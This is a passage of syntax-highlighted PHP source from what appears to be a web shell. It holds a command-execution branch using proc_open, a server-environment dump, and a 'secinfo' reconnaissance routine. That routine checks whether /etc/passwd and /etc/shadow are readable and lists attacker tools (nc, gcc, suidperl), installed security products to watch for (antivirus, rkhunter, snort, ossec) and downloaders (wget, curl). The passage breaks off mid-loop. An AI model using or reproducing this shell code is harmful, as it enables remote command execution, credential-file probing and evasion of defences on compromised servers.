<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">fclose(</span>$<span style="color: #ffcc66;">pipes</span>[<span style="color: #cccccc; background-color: #2d2d2d;">1</span>]);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">while</span> (!<span style="color: #cccccc; background-color: #2d2d2d;">feof(</span>$<span style="color: #ffcc66;">pipes</span>[<span style="color: #cccccc; background-color: #2d2d2d;">2</span>])) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">echo</span> <span style="color: #cccccc; background-color: #2d2d2d;">fgets(</span>$<span style="color: #ffcc66;">pipes</span>[<span style="color: #cccccc; background-color: #2d2d2d;">2</span>], <span style="color: #cccccc; background-color: #2d2d2d;">1024</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">fclose(</span>$<span style="color: #ffcc66;">pipes</span>[<span style="color: #cccccc; background-color: #2d2d2d;">2</span>]);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">proc_close(</span>$<span style="color: #ffcc66;">process</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">echo</span>(<span style="color: #cccccc; background-color: #2d2d2d;">execute(</span>$<span style="color: #ffcc66;">command</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/pre&gt;'</span>);
<span style="background-color: #515151;"> </span>   }
}<span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">end shell</span>

<span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">action</span> == <span style="color: #66cccc;">'phpenv'</span>) {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">upsize</span>=<span style="color: #cccccc; background-color: #2d2d2d;">getcfg(</span><span style="color: #66cccc;">'file_uploads'</span>) ? <span style="color: #cccccc; background-color: #2d2d2d;">getcfg(</span><span style="color: #66cccc;">'upload_max_filesize'</span>) : <span style="color: #66cccc;">'Not allowe</span><span style="color: #66cccc; text-decoration: underline;">d'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">adminmail</span>=<span style="color: #cccccc; background-color: #2d2d2d;">isset(</span>$<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'SERVER_ADMIN'</span>]) ? $<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'SERVER_ADMIN'</span>] : <span style="color: #cccccc; background-color: #2d2d2d;">getc</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">fg(</span><span style="color: #66cccc; text-decoration: underline;">'sendmail_from'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">dis_func</span> &amp;&amp; $<span style="color: #ffcc66;">dis_func</span> = <span style="color: #66cccc;">'No'</span>;<span style="color: #f2777a; background-color: #515151;">     </span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">info</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">1</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'Server Time'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">date(</span><span style="color: #66cccc;">'Y/m/d h:i:s'</span>,$<span style="color: #ffcc66;">timestamp</span>)),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">2</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'Server Domain'</span>,$<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'SERVER_NAME'</span>]),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">3</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'Server IP'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">gethostbyname(</span>$<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'SERVER_NAME'</span>])),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">4</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'Server OS'</span>,<span style="color: #6699cc;">PHP_OS</span>),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">5</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'Server OS Charset'</span>,$<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'HTTP_ACCEPT_LANGUAGE'</span>]),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">6</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'Server Software'</span>,$<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'SERVER_SOFTWARE'</span>]),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">7</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'Server Web Port'</span>,$<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'SERVER_PORT'</span>]),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">8</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'PHP run mode'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">strtoupper(php_sapi_name(</span>))),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">9</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'The file path'</span>,<span style="color: #6699cc;">__FILE__</span>),

<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">10</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'PHP Version'</span>,<span style="color: #6699cc;">PHP_VERSION</span>),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">11</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'PHPINFO'</span>,(<span style="color: #f2777a; font-weight: bold;">IS_PHPINFO</span> ? <span style="color: #66cccc;">'&lt;a href="javascript:g(\'phpinfo\');</span><span style="color: #66cccc; text-decoration: underline;">"&gt;Yes&lt;/a&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #66cccc; text-decoration: underline;">'No'</span><span style="text-decoration: underline;">)),</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">12</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'Safe Mode'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">getcfg(</span><span style="color: #66cccc;">'safe_mode'</span>)),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">13</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'Administrator'</span>,$<span style="color: #ffcc66;">adminmail</span>),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">14</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'allow_url_fopen'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">getcfg(</span><span style="color: #66cccc;">'allow_url_fopen'</span>)),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">15</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'enable_dl'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">getcfg(</span><span style="color: #66cccc;">'enable_dl'</span>)),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">16</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'display_errors'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">getcfg(</span><span style="color: #66cccc;">'display_errors'</span>)),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">17</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'register_globals'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">getcfg(</span><span style="color: #66cccc;">'register_globals'</span>)),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">18</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'magic_quotes_gpc'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">getcfg(</span><span style="color: #66cccc;">'magic_quotes_gpc'</span>)),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">19</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'memory_limit'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">getcfg(</span><span style="color: #66cccc;">'memory_limit'</span>)),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">20</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'post_max_size'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">getcfg(</span><span style="color: #66cccc;">'post_max_size'</span>)),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">21</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'upload_max_filesize'</span>,$<span style="color: #ffcc66;">upsize</span>),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">22</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'max_execution_time'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">getcfg(</span><span style="color: #66cccc;">'max_execution_time'</span>).<span style="color: #66cccc;">' second(s</span><span style="color: #66cccc; text-decoration: underline;">)'</span><span style="text-decoration: underline;">),</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">23</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'disable_functions'</span>,$<span style="color: #ffcc66;">dis_func</span>),
<span style="background-color: #515151;"> </span>   );

<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">phpvarname</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span>$<span style="color: #ffcc66;">phpvarname</span> .<span style="color: #66cccc;">' : '</span>.<span style="color: #cccccc; background-color: #2d2d2d;">getcfg(</span>$<span style="color: #ffcc66;">phpvarname</span>));
<span style="background-color: #515151;"> </span>   }

<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'Server environment'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>,<span style="color: #66cccc;">'phpenv'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'Please input PHP configuration parameter(eg:magic_</span><span style="color: #66cccc; text-decoration: underline;">quotes_gpc)'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #66cccc; text-decoration: underline;">'phpvarname'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'value'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #ffcc66; text-decoration: underline;">phpvarname</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfooter(</span>);

<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">hp</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(0</span>=&gt; <span style="color: #66cccc;">'Server'</span>, <span style="color: #cccccc; background-color: #2d2d2d;">1</span>=&gt; <span style="color: #66cccc;">'PHP'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">for</span>($<span style="color: #ffcc66;">a</span>=<span style="color: #cccccc; background-color: #2d2d2d;">0</span>;$<span style="color: #ffcc66;">a</span>&lt;<span style="color: #cccccc; background-color: #2d2d2d;">2</span>;$<span style="color: #ffcc66;">a</span>++) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;h2&gt;'</span>.$<span style="color: #ffcc66;">hp</span>[$<span style="color: #ffcc66;">a</span>].<span style="color: #66cccc;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;ul class="info"&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">a</span>==<span style="color: #cccccc; background-color: #2d2d2d;">0</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">for</span>($<span style="color: #ffcc66;">i</span>=<span style="color: #cccccc; background-color: #2d2d2d;">1</span>;$<span style="color: #ffcc66;">i</span>&lt;=<span style="color: #cccccc; background-color: #2d2d2d;">9</span>;$<span style="color: #ffcc66;">i</span>++) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;li&gt;&lt;u&gt;'</span>.$<span style="color: #ffcc66;">info</span>[$<span style="color: #ffcc66;">i</span>][<span style="color: #cccccc; background-color: #2d2d2d;">0</span>].<span style="color: #66cccc;">':&lt;/u&gt;'</span>.$<span style="color: #ffcc66;">info</span>[$<span style="color: #ffcc66;">i</span>][<span style="color: #cccccc; background-color: #2d2d2d;">1</span>].<span style="color: #66cccc;">'&lt;/li&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">a</span> == <span style="color: #cccccc; background-color: #2d2d2d;">1</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">for</span>($<span style="color: #ffcc66;">i</span>=<span style="color: #cccccc; background-color: #2d2d2d;">10</span>;$<span style="color: #ffcc66;">i</span>&lt;=<span style="color: #cccccc; background-color: #2d2d2d;">23</span>;$<span style="color: #ffcc66;">i</span>++) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;li&gt;&lt;u&gt;'</span>.$<span style="color: #ffcc66;">info</span>[$<span style="color: #ffcc66;">i</span>][<span style="color: #cccccc; background-color: #2d2d2d;">0</span>].<span style="color: #66cccc;">':&lt;/u&gt;'</span>.$<span style="color: #ffcc66;">info</span>[$<span style="color: #ffcc66;">i</span>][<span style="color: #cccccc; background-color: #2d2d2d;">1</span>].<span style="color: #66cccc;">'&lt;/li&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/ul&gt;'</span>);
<span style="background-color: #515151;"> </span>   }
}<span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">end phpenv</span>

<span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">action</span> == <span style="color: #66cccc;">'secinfo'</span>) {

<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'Server software'</span>, @<span style="color: #cccccc; background-color: #2d2d2d;">getenv(</span><span style="color: #66cccc;">'SERVER_SOFTWARE'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'Disabled PHP Functions'</span>, ($<span style="color: #6699cc;">GLOBALS</span>[<span style="color: #66cccc;">'disable_functions'</span>])?$<span style="color: #6699cc;">GLOBALS</span>[<span style="color: #66cccc; text-decoration: underline;">'disable_functions'</span><span style="text-decoration: underline;">]:</span><span style="color: #66cccc; text-decoration: underline;">'none'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'Open base dir'</span>, @<span style="color: #cccccc; background-color: #2d2d2d;">ini_get(</span><span style="color: #66cccc;">'open_basedir'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'Safe mode exec dir'</span>, @<span style="color: #cccccc; background-color: #2d2d2d;">ini_get(</span><span style="color: #66cccc;">'safe_mode_exec_dir'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'Safe mode include dir'</span>, @<span style="color: #cccccc; background-color: #2d2d2d;">ini_get(</span><span style="color: #66cccc;">'safe_mode_include_dir'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'cURL support'</span>, <span style="color: #cccccc; background-color: #2d2d2d;">function_exists(</span><span style="color: #66cccc;">'curl_version'</span>)?<span style="color: #66cccc;">'enabled'</span>:<span style="color: #66cccc;">'no'</span>);
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">temp</span>=<span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">function_exists(</span><span style="color: #66cccc;">'mysql_get_client_info'</span>))
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">temp</span>[] = <span style="color: #66cccc;">"MySql ("</span>.<span style="color: #cccccc; background-color: #2d2d2d;">mysql_get_client_info(</span>).<span style="color: #66cccc;">")"</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">function_exists(</span><span style="color: #66cccc;">'mssql_connect'</span>))
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">temp</span>[] = <span style="color: #66cccc;">"MSSQL"</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">function_exists(</span><span style="color: #66cccc;">'pg_connect'</span>))
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">temp</span>[] = <span style="color: #66cccc;">"PostgreSQL"</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">function_exists(</span><span style="color: #66cccc;">'oci_connect'</span>))
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">temp</span>[] = <span style="color: #66cccc;">"Oracle"</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'Supported databases'</span>, <span style="color: #cccccc; background-color: #2d2d2d;">implode(</span><span style="color: #66cccc;">', '</span>, $<span style="color: #ffcc66;">temp</span>));

<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>( !<span style="color: #f2777a; font-weight: bold;">IS_WIN</span> ) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">userful</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'gcc'</span>,<span style="color: #66cccc;">'lcc'</span>,<span style="color: #66cccc;">'cc'</span>,<span style="color: #66cccc;">'ld'</span>,<span style="color: #66cccc;">'make'</span>,<span style="color: #66cccc;">'php'</span>,<span style="color: #66cccc;">'perl'</span>,<span style="color: #66cccc;">'python'</span>,<span style="color: #66cccc;">'rub</span><span style="color: #66cccc; text-decoration: underline;">y'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'tar'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'gzip'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'bzip'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'bzip2'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'nc'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'locate'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'suidperl'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">danger</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'kav'</span>,<span style="color: #66cccc;">'nod32'</span>,<span style="color: #66cccc;">'bdcored'</span>,<span style="color: #66cccc;">'uvscan'</span>,<span style="color: #66cccc;">'sav'</span>,<span style="color: #66cccc;">'drwebd'</span>,<span style="color: #66cccc;">'clamd'</span>,<span style="color: #66cccc; text-decoration: underline;">'rkhunter'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'chkrootkit'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'iptables'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'ipfw'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'tripwire'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'shieldcc'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'portsentry'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'snort'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'ossec'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'lidsadm'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'tcplodg'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'sxid'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'logcheck'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'logwatch'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'sysmask'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'zmbscap'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'sawmill'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'wormscan'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'ninja'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">downloaders</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'wget'</span>,<span style="color: #66cccc;">'fetch'</span>,<span style="color: #66cccc;">'lynx'</span>,<span style="color: #66cccc;">'links'</span>,<span style="color: #66cccc;">'curl'</span>,<span style="color: #66cccc;">'get'</span>,<span style="color: #66cccc;">'lwp-mir</span><span style="color: #66cccc; text-decoration: underline;">ror'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'Readable /etc/passwd'</span>, @<span style="color: #cccccc; background-color: #2d2d2d;">is_readable(</span><span style="color: #66cccc;">'/etc/passwd'</span>) ? <span style="color: #66cccc;">"yes"</span> : <span style="color: #66cccc;">'</span><span style="color: #66cccc; text-decoration: underline;">no'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'Readable /etc/shadow'</span>, @<span style="color: #cccccc; background-color: #2d2d2d;">is_readable(</span><span style="color: #66cccc;">'/etc/shadow'</span>) ? <span style="color: #66cccc;">"yes"</span> : <span style="color: #66cccc;">'</span><span style="color: #66cccc; text-decoration: underline;">no'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'OS version'</span>, @<span style="color: #cccccc; background-color: #2d2d2d;">file_get_contents(</span><span style="color: #66cccc;">'/proc/version'</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">secparam(</span><span style="color: #66cccc;">'Distr name'</span>, @<span style="color: #cccccc; background-color: #2d2d2d;">file_get_contents(</span><span style="color: #66cccc;">'/etc/issue.net'</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">safe_mode</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">ini_get(</span><span style="color: #66cccc;">'safe_mode'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(!$<span style="color: #6699cc;">GLOBALS</span>[<span style="color: #66cccc;">'safe_mode'</span>]) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">temp</span>=<span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span> ($<span style="color: #ffcc66;">userful</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">item</span>)
